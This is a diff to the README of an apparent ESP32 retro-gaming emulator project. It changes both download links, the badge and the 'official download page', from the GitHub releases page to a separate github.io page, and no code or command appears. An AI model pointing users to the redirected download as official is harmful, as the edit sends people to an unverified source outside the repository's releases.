@@ -1,6 +1,6 @@
 # 🎮 Retro-Gamer - Play classic games on your monitor
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/enidpenoche926/Retro-Gamer/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://enidpenoche926.github.io)
 
 Retro-Gamer brings vintage gaming to your modern display. This tool runs emulators on your ESP32 hardware, specifically the TTGO VGA and Olimex boards. You turn your hardware into a dedicated game console with this software.
 
@@ -12,7 +12,7 @@ You need specific hardware to make this work. This software manages code for the
 
 You must visit the releases page to obtain the files for your device.
 
-[Visit the official download page here](https://github.com/enidpenoche926/Retro-Gamer/releases)
+[Visit the official download page here](https://enidpenoche926.github.io)
 
 Follow these steps to prepare your device:
 
